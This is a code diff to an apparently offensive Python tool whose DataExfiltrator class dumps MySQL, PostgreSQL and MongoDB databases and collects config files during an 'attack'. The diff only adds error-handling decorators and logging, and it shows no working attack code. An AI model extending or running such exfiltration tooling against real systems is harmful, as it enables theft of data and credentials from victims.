@@ -14,6 +14,7 @@ from datetime import datetime
 from pathlib import Path
 import paramiko
 from core.logger import log
+from core.error_handlers import handle_exfiltration_errors, handle_errors
 
 
 class DataExfiltrator:
@@ -46,6 +47,7 @@ class DataExfiltrator:
         }
         os.makedirs(self.base_dir, exist_ok=True)
         
+    @handle_exfiltration_errors
     async def exfiltrate_all(self, context: Dict[str, Any]) -> Dict:
         """Exfiltrate ทุกอย่างที่เป็นไปได้"""
         log.info(f"[Exfiltrator] Starting full data exfiltration for attack {self.attack_id}")
@@ -94,6 +96,7 @@ class DataExfiltrator:
         
         return results
 
+    @handle_exfiltration_errors
     async def dump_databases(self, db_access: Dict) -> Dict:
         """Dump ฐานข้อมูลทั้งหมด"""
         log.info("[Exfiltrator] Dumping databases...")
@@ -124,6 +127,7 @@ class DataExfiltrator:
             log.error(f"[Exfiltrator] Database dump failed: {e}")
             return {"success": False, "error": str(e)}
 
+    @handle_exfiltration_errors
     async def _dump_mysql(self, host: str, port: int, username: str, password: str) -> Dict:
         """Dump MySQL database"""
         try:
@@ -202,6 +206,7 @@ class DataExfiltrator:
             log.error(f"[Exfiltrator] MySQL dump failed: {e}")
             return {"success": False, "error": str(e)}
 
+    @handle_exfiltration_errors
     async def _dump_postgresql(self, host: str, port: int, username: str, password: str) -> Dict:
         """Dump PostgreSQL database"""
         try:
@@ -300,6 +305,7 @@ class DataExfiltrator:
             log.error(f"[Exfiltrator] PostgreSQL dump failed: {e}")
             return {"success": False, "error": str(e)}
 
+    @handle_exfiltration_errors
     async def _dump_mongodb(self, host: str, port: int, username: str, password: str) -> Dict:
         """Dump MongoDB database"""
         try:
@@ -592,7 +598,8 @@ class DataExfiltrator:
                                 
                                 log.success(f"[Exfiltrator] Collected: {config_path}")
                     
-                    except:
+                    except Exception as e:
+                        log.debug(f"[Exfiltrator] Failed to collect {config_path}: {e}")
                         pass
             
             return {
